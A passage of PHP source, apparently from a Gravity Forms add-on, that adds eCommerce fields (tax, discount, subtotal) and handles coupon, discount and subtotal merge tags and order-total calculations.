					<?php foreach ( $this->merge_tags as $tag ) : ?>
					mergeTags['pricing'].tags.push( { tag: '<?php echo $tag['tag']; ?>', label: '<?php echo $tag['label']; ?>' } );
					<?php endforeach; ?>
					return mergeTags;
				} );
			}

			// hacky, but only temporary; add merge tags to calculation merge tag select
			jQuery( document ).ready( function( $ ) {

				var calcMergeTagSelect = $('#field_calculation_formula_variable_select');
				calcMergeTagSelect.append( '<optgroup label="<?php _e( 'eCommerce Merge Tags' ); ?>" />' )
				<?php
				foreach ( $this->merge_tags as $tag ) :
					if ( $tag['isCalculable'] ) :
						?>
						calcMergeTagSelect.find('optgroup:last-child').append( '<option value="<?php echo $tag['tag']; ?>"><?php echo $tag['label']; ?></option>' );
						<?php
					endif;
				endforeach;
				?>

			} );

		</script>

		<?php
	}

	public function add_merge_tags_footer() {
		$form = GFAPI::get_form( rgget( 'id' ) );
		if ( $form ) {
			$this->add_merge_tags();
		}
	}

	/**
	 * Calculation fields which include the {coupons} merge tag must be recalculated after coupons have been processed.
	 *
	 * Note: I'm not sure if the above description is entirely accurate... as it seems using {coupons} in Calculated
	 * Product fields would create infinite recursion? I do suspect this is needed though. We will have to investigate
	 * why it is needed.
	 *
	 * @param $product_info
	 * @param $form
	 * @param $entry
	 *
	 * @return mixed
	 */
	public function reprocess_calculations( $order, $form, $entry ) {
		global $wpdb;

		$current_fields = array();

		foreach ( $form['fields'] as $field ) {

			if ( ! $field->has_calculation() || GFFormsModel::is_field_hidden( $form, $field, array(), $entry ) ) {
				continue;
			}

			$is_product = $field['type'] === 'product';
			$input_id   = $is_product ? sprintf( '%s.%s', $field['id'], 2 ) : $field['id'];
			$input_name = 'input_' . str_replace( '.', '_', $input_id );

			// Do not reprocess Calculated Products fields with no quantity.
			if ( $is_product && ! $this->get_product_quantity( $field, $form, $entry ) ) {
				continue;
			}

			if ( $entry['id'] ) {

				if ( empty( $current_fields ) ) {
					if ( version_compare( $this->get_gravityforms_db_version(), '2.3-dev-1', '<' ) ) {
						$lead_detail_table = GFFormsModel::get_lead_details_table_name();
						// phpcs:disable
						// See: https://github.com/WordPress/WordPress-Coding-Standards/issues/1589
						$current_fields = $wpdb->get_results( $wpdb->prepare( "SELECT id, field_number FROM $lead_detail_table WHERE lead_id = %d", $entry['id'] ) );
						// phpcs:enable
					} elseif ( version_compare( $this->get_gravityforms_db_version(), '2.4', '<' ) ) {
						$current_fields = $wpdb->get_results( $wpdb->prepare( "SELECT id, meta_key FROM {$wpdb->prefix}gf_entry_meta WHERE entry_id = %d", $entry['id'] ) );
					} else {
						$current_fields = $wpdb->get_results( $wpdb->prepare( "SELECT id, meta_key, item_index FROM {$wpdb->prefix}gf_entry_meta WHERE entry_id = %d", $entry['id'] ) );
					}
				}

				$value          = GFFormsModel::prepare_value( $form, $field, null, $input_name, rgar( $entry, 'id' ), $entry );
				$lead_detail_id = GFFormsModel::get_lead_detail_id( $current_fields, $input_id );
				$result         = GFFormsModel::update_lead_field_value( $form, $entry, $field, $lead_detail_id, $input_id, $value );

				if ( $is_product ) {
					$order['products'][ $field->id ]['price'] = $value;
				}
			}
			// if we aren't working with a real entry, let's fetch the total from the $_POST
			elseif ( $is_product ) {

				$entry = GFFormsModel::get_current_lead();
				if ( $entry ) {
					$order['products'][ $field->id ]['price'] = $field->get_value_save_entry( rgpost( "input_{$field->id}_2" ), $form, $input_name, null, $entry );
					GFFormsModel::set_current_lead( false );
				}
			}
		}

		return $order;
	}

	public function get_product_quantity( $product_field, $form, $entry ) {

		$quantity_fields = GFCommon::get_product_fields_by_type( $form, array( 'quantity' ), $product_field->id );
		$quantity_field  = array_shift( $quantity_fields );
		$quantity        = $quantity_field && ! GFFormsModel::is_field_hidden( $form, $quantity_field, array(), $entry ) ? GFFormsModel::get_lead_field_value( $entry, $quantity_field ) : 1;

		$product_quantity = ! $quantity_field && ! $product_field->disableQuantity ? rgar( $entry, $product_field->id . '.3' ) : $quantity;

		return $product_quantity;
	}

	public function get_gravityforms_db_version() {

		if ( method_exists( 'GFFormsModel', 'get_database_version' ) ) {
			$db_version = GFFormsModel::get_database_version();
		} else {
			$db_version = GFForms::$version;
		}

		return $db_version;
	}

	public function replace_merge_tags( $text, $form, $entry, $url_encode, $esc_html, $nl2br, $format ) {

		if ( ! $form ) {
			return $text;
		}

		preg_match_all( '/{order_summary(?::?(.+)?)}/m', $text, $matches, PREG_SET_ORDER );
		foreach ( $matches as $match ) {

			list( $search, $modifiers ) = array_pad( $match, 2, '' );

			$replace   = '';
			$modifiers = explode( ',', $modifiers );

			foreach ( $modifiers as $modifier ) {
				switch ( $modifier ) {
					case 'value':
						$use_choice_text = false;
						$replace         = $this->get_order_summary_markup( $this->get_order( $form, $entry, $use_choice_text ), $form, $entry, $modifiers );
						break;
				}
			}

			if ( ! $replace ) {
				$replace = $this->get_order_summary_markup( $this->get_order( $form, $entry ), $form, $entry, false, false, false, $modifiers );
			}

			$text = str_replace( $search, $replace, $text );

		}

		return $this->replace_formula_merge_tags( $text, null, $form, $entry, 'currency' );
	}

	/**
	 * Replace the {coupons} merge tag in calculation formulas and anywhere merge tags are supported.
	 *
	 * @param        $formula
	 * @param        $field
	 * @param        $form
	 * @param        $entry
	 * @param string $format
	 *
	 * @return mixed
	 */
	public function replace_formula_merge_tags( $formula, $field, $form, $entry, $format = 'number' ) {

		$coupons_merge_tag   = '{coupons}';
		$discounts_merge_tag = '{discounts}';
		$subtotal_merge_tag  = '{subtotal}';
		$has_merge_tag       = strpos( $formula, $coupons_merge_tag ) !== false || strpos( $formula, $discounts_merge_tag ) !== false || strpos( $formula, $subtotal_merge_tag ) !== false;

		if ( ! $entry ) {
			$entry = GFFormsModel::get_current_lead();
			GFFormsModel::set_current_lead( false );
		}

		if ( ! $has_merge_tag || ! $entry ) {
			$formula = str_replace( $coupons_merge_tag, 0, $formula );
			$formula = str_replace( $discounts_merge_tag, 0, $formula );
			$formula = str_replace( $subtotal_merge_tag, 0, $formula );
			return $formula;
		}

		// Be wary of this...
		$order = $this->get_current_order();
		if ( $order === false ) {
			// If the current order is false, we assume that someone is calling the GFFormsModel::create_lead() method.
			// That method will indirectly trigger this method with a partial entry. Let's set that partial entry as the
			// current entry so that get_order() won't call create_lead() again and we'll also need to manually populate
			// the quantity values for any Calculation fields on the form. This does not impact functioanlity (as far as
			// I can tell) but it does suppress several notices.
			$entry = $this->add_quantity_for_calculation_fields( $entry, $form );
			GFFormsModel::set_current_lead( $entry );
			$this->get_order( $form, $entry );
		}

		$order = $this->get_current_order();

		// As far as I can tell, this scenario will only happen when editing an entry. Calculations are reprocessed after
		// everything else is finished so it appears to be a none issue to fail silently here.
		if ( $order === false ) {
			return $formula;
		}

		$coupons_total   = 0;
		$discounts_total = 0;

		// Exclude current Calculation Product field and all subsequent Calculation Product fields.
		$exclude_products = $field && $field->type === 'product' ? array( $field->id ) : array();
		if ( ! empty( $exclude_products ) ) {
			$target_index = 0;
			foreach ( $form['fields'] as $index => $_field ) {
				if ( $field->type === 'product' && $target_index && $index > $target_index ) {
					$exclude_products[] = $_field->id;
				} elseif ( ! $target_index && intval( $_field->id ) === intval( $field->id ) ) {
					$target_index = $index;
				}
			}
		}

		$subtotal_total = GF_Field_Subtotal::get_subtotal( $order, $exclude_products );

		foreach ( $order['products'] as $product ) {
			// Ensure that price is always read as a number
			$price = GFCommon::to_number( rgar( $product, 'price', 0 ) );
			if ( rgar( $product, 'isDiscount' ) ) {
				$discounts_total += $price;
			} elseif ( rgar( $product, 'isCoupon' ) ) {
				$coupons_total += $price;
			}
		}

		$coupons_total   = abs( $coupons_total );
		$discounts_total = abs( $discounts_total ) + $coupons_total;

		if ( $format === 'currency' ) {
			$coupons_total   = GFCommon::to_money( $coupons_total, rgar( $entry, 'currency' ) );
			$discounts_total = GFCommon::to_money( $discounts_total, rgar( $entry, 'currency' ) );
			$subtotal_total  = GFCommon::to_money( $subtotal_total, rgar( $entry, 'currency' ) );
		}

		$formula = str_replace( $coupons_merge_tag, $coupons_total, $formula );
		$formula = str_replace( $discounts_merge_tag, $discounts_total, $formula );
		$formula = str_replace( $subtotal_merge_tag, $subtotal_total, $formula );

		return $formula;
	}

	/**
	 * Fetch the current $order object.
	 *
	 * The current $order object is set in add_ecommerce_fields_to_order() and used by replace_formula_merge_tags()
	 * to calculate totals for our ecommerce merge tags.
	 *
	 * @return bool
	 */
	public function get_current_order() {
		return ! empty( $this->_order ) ? $this->_order : false;
	}

	public function get_total( $order ) {
		return max( 0, GFCommon::get_total( $order ) );
	}

	public function _get_product_total( $order ) {
		return GFCommon::get_total( $order );
	}

	public function get_products_total( $order, $products, $include_discounts, $form, $entry ) {

		$total = 0;

		foreach ( $order['products'] as $field_id => $product ) {
			if ( in_array( $field_id, $products ) ) {
				// little hacky but didn't want to rewrite the code for getting a single product's total
				$product_total = $this->_get_product_total(
					array(
						'products' => array( $product ),
						'shipping' => array( 'price' => 0 ),
					)
				);
				$total        += $product_total;
				if ( $include_discounts ) {
					$total -= GF_Field_Discount::get_product_discount( $order, $form, $entry, $field_id, $product_total );
				}
			}
		}

		return $total;
	}

	public function get_field_total( $order, $entry, $total, $args = array(), $form = false ) {

		$args = array_filter( $args, array( $this, 'not_blank' ) );

		$args = wp_parse_args(
			$args,
			array(
				'amount'             => 0,
				'amountType'         => 'percent',
				'products'           => null,
				'productsType'       => null,
				'includeShipping'    => true,
				'includeDiscounts'   => false,
				'calculateByProduct' => false,
			)
		);

		$products_total = $args['productsType'] !== 'all' && ! empty( $args['products'] ) ? $this->get_products_total( $order, $args['products'], $args['includeDiscounts'], $form, $entry ) : 0;

		if ( ! $args['includeShipping'] ) {
			$total -= $this->get_shipping_total( $order, $entry );
		}

		switch ( $args['productsType'] ) {
			case 'include':
				$total = $products_total;
				break;
			case 'exclude':
				$total -= $products_total;
				break;
		}

		switch ( $args['amountType'] ) {
			// used by subtotal field
			case $args['amountType'] === null:
				$field_total = $total;
				break;
			case 'percent':
				$field_total = $total * ( $args['amount'] / 100 );
				break;
			default:
				$amount = $args['amount'];
				if ( $args['calculateByProduct'] ) {
					$order_total      = GF_Field_Subtotal::get_subtotal( $order );
					$total_percentage = ( $total * 100 ) / $order_total;
					$amount          *= ( $total_percentage / 100 );
				}
				$field_total = $amount;
		}

		// GF can't handle 3+ decimal floats for currency
		$field_total = round( max( 0, $field_total ), 2 );

		return $field_total;
	}

	public function not_blank( $value ) {
		return is_array( $value ) ? ! empty( $value ) : ! rgblank( $value );
	}

	public function get_shipping_total( $order, $entry ) {
		return GFCommon::to_number( $order['shipping']['price'], $entry['currency'] );
	}

	/**
	 * Remove coupons and then re-add to the $order object.
	 *
	 * @param $order
	 * @param $form
	 * @param $entry
	 *
	 * @return array
	 */
	public function update_order_coupons( $order, $form, $entry ) {
		if ( is_callable( 'gf_coupons' ) ) {
			$order = gf_coupons()->add_discounts( $order, $form, $entry );
		}

		return $order;
	}

	/**
	 * eCommerce fields should not be included as separate fields; only in the order summary. Remove them from the {all_fields} merge tag.
	 *
	 * @param $field_value
	 * @param $merge_tag
	 * @param $options
	 * @param $field
	 * @param $field_label
	 *
	 * @return bool
	 */
	public function remove_field_from_all_fields( $field_value, $merge_tag, $options, $field, $field_label ) {

		if ( $merge_tag === 'all_fields' && in_array( $field->get_input_type(), array( 'tax', 'discount', 'subtotal' ), true ) ) {
			$field_value = false;
		}

		return $field_value;
	}

	public function format_merge_tag_currency( $field_value, $merge_tag, $options, $field, $field_label ) {

		if ( $this->is_ecommerce_field( $field ) ) {
			$field_value = GFCommon::to_money( $field_value );
		}

		return $field_value;
	}

	public function hide_field_from_entry_detail( $content, $field ) {
		if ( $field->is_entry_detail() && in_array( $field->get_input_type(), array( 'tax', 'discount', 'subtotal' ), true ) ) {
			$content = '';
		}
		return $content;
	}

	public function format_entry_list_field_value( $value, $form_id, $field_id, $entry ) {

		$form  = GFAPI::get_form( $form_id );
		$field = GFFormsModel::get_field( $form, $field_id );
		if ( ! $field || ! $this->is_ecommerce_field( $field ) ) {
			return $value;
		}

		return GFCommon::to_money( $value, rgar( $entry, 'currency' ) );
	}

	public function add_product_field_types( $field_types ) {
		return array_merge( $field_types, $this->get_ecommerce_field_types() );
	}

	/**
	 * By default, Gravity Forms will allow negative totals. Prevent this with GPECF.
	 *
	 * @param $value
	 * @param $entry
	 * @param GF_Field $field
	 * @param $form
	 *
	 * @return mixed
	 */
	public function prevent_negative_totals( $value, $entry, $field, $form ) {
		if ( is_a( $field, 'GF_Field' ) && $field->get_input_type() === 'total' && $this->_order && ( $this->has_ecommerce_field( $form ) || $this->has_ecommerce_merge_tag( $form ) ) ) {
			$value = $this->get_total( $this->_order );
		}
		return $value;
	}

	public function add_quantity_for_calculation_fields( $entry, $form ) {
		foreach ( $form['fields'] as $field ) {
			if ( $field->get_input_type() === 'calculation' ) {

				// Quantity
				$input_id = sprintf( '%d.3', $field->id );
				if ( ! isset( $entry[ $input_id ] ) ) {
					$entry[ $input_id ] = GFFormsModel::get_prepared_input_value( $form, $field, $entry, $input_id );
				}

				// Sometimes the label needs to be populated too to suppress notices...
				$input_id = sprintf( '%d.1', $field->id );
				if ( ! isset( $entry[ $input_id ] ) ) {
					$entry[ $input_id ] = $field->get_field_label( true, array() );
				}
			}
		}
		return $entry;
	}



	# 3rd Party Support

	public function hide_field_in_wc_cart_item_description( $display_text, $display_value, $field ) {
		return $this->is_ecommerce_field( $field ) ? '' : $display_text;
	}

	public function add_wc_class_to_hide_fields_in_cart_description( $form ) {

		if ( ! doing_filter( 'woocommerce_get_item_data' ) ) {
			return $form;
		}

		foreach ( $form['fields'] as &$field ) {
			if ( $this->is_ecommerce_field( $field ) ) {
				$field->cssClass = 'wc-gforms-hide-from-email';
			}
		}

		return $form;
	}



	# HELPERS

	public function has_field_types( $form, $types ) {
		if ( ! is_array( $types ) ) {
			$types = array( $types );
		}
		$fields = (array) GFAPI::get_fields_by_type( $form, $types );
		return count( $fields ) > 0;
	}

	public function has_line_item_type( $order, $type ) {

		$props = array(
			'discount' => 'isDiscount',
			'tax'      => 'isDiscount',
		);

		$prop = rgar( $props, $type );
		if ( ! $prop ) {
			return false;
		}

		foreach ( $order['products'] as $product ) {
			if ( rgar( $product, $prop ) ) {
				return true;
			}
		}

		return false;
	}

	public function has_shipping( $order ) {
		return ! empty( $order['shipping']['name'] );
	}

	public function has_coupon( $order, $form, $entry ) {

		if ( ! is_callable( 'gf_coupons' ) ) {
			return false;
		}

		if ( isset( $order['products'] ) && is_array( $order['products'] ) ) {
			foreach ( $order['products'] as $key => $product ) {
				if ( $this->is_valid_coupon( $key, $form, $entry ) ) {
					return true;
				}
			}
		}

		$coupon_fields = GFCommon::get_fields_by_type( $form, array( 'coupon' ) );
		foreach ( $coupon_fields as $coupon_field ) {
			if ( rgar( $entry, $coupon_field->id ) ) {
				return true;
			}
		}

		return false;
	}

	public function is_valid_coupon( $key, $form, $entry ) {

		if ( ! is_callable( 'gf_coupons' ) ) {
			return false;
		}

		$coupons = (array) gf_coupons()->get_submitted_coupon_codes( $form, $entry );
		$code    = $this->parse_coupon_code_from_key( $key );

		return in_array( (string) $code, $coupons, true );
	}

	public function parse_coupon_code_from_key( $key ) {

		if ( strpos( $key, '|' ) !== false ) {
			$key = explode( '|', $key );
			$key = $key[1];
		}

		return $key;
	}

	public function has_ecommerce_merge_tag( $object ) {

		if ( isset( $object['fields'] ) && is_array( $object['fields'] ) ) {
			foreach ( $object['fields'] as $field ) {
				if ( $this->has_ecommerce_merge_tag( $field ) ) {
					return true;
				}
			}
		} else {
			if ( isset( $object['calculationFormula'] ) ) {
				foreach ( $this->merge_tags as $merge_tag ) {
					if ( strpos( $object['calculationFormula'], $merge_tag['tag'] ) !== false ) {
						return true;
					}
				}
			}
		}

		return false;
	}

	public function has_ecommerce_field( $form ) {
		return $this->has_field_types( $form, $this->get_ecommerce_field_types() );
	}

	public function is_ecommerce_field( $field ) {
		return in_array( $field->get_input_type(), $this->get_ecommerce_field_types(), true );
	}

	public function get_ecommerce_field_types() {
		return array( 'tax', 'discount', 'subtotal' );
	}

	public function is_ecommerce_product( $product ) {
		return rgar( $product, 'isDiscount' ) || rgar( $product, 'isCoupon' ) || rgar( $product, 'isTax' );
	}

	public function get_order( $form, $entry, $use_choice_text = true ) {
		return GFCommon::get_product_fields( $form, $entry, $use_choice_text );
	}


	# REVIEW

	public function _refresh_cache_for_calculation_fields( $form, $entry ) {

		foreach ( $form['fields'] as $field ) {
			if ( $field->has_calculation() ) {

				$cache_key = 'GFFormsModel::get_lead_field_value_' . $entry['id'] . '_' . $field->id;
				GFCache::delete( $cache_key );

				if ( is_array( $field->inputs ) ) {
					$inputs = $field->inputs;
					foreach ( $inputs as $input ) {
						$cache_key = 'GFFormsModel::get_lead_field_value_' . $entry['id'] . '_' . $input['id'];
						GFCache::delete( $cache_key );
					}
				}
			}
		}

	}

}

function gp_ecommerce_fields() {
	return GP_Ecommerce_Fields::get_instance();
}

GFAddOn::register( 'GP_Ecommerce_Fields' );
